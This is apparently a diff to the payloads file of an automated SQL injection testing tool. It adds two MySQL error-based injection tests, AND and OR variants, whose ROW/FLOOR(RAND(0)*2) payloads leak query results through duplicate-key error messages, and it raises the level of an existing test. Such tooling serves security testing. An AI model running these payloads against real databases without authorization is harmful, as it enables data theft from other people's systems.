@@ -1010,6 +1010,26 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM] UNION SELECT [RANDNUM1])a GROUP BY x LIMIT 1)</vector>
+        <request>
+            <payload>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM] UNION SELECT [RANDNUM1])a GROUP BY x LIMIT 1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 4.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>PostgreSQL AND error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>1</level>
@@ -1168,9 +1188,29 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL OR error-based - WHERE or HAVING clause</title>
+        <title>MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>2</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM] UNION SELECT [RANDNUM1])a GROUP BY x LIMIT 1)</vector>
+        <request>
+            <payload>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM] UNION SELECT [RANDNUM1])a GROUP BY x LIMIT 1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 4.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
         <risk>0</risk>
         <clause>1</clause>
         <where>2</where>
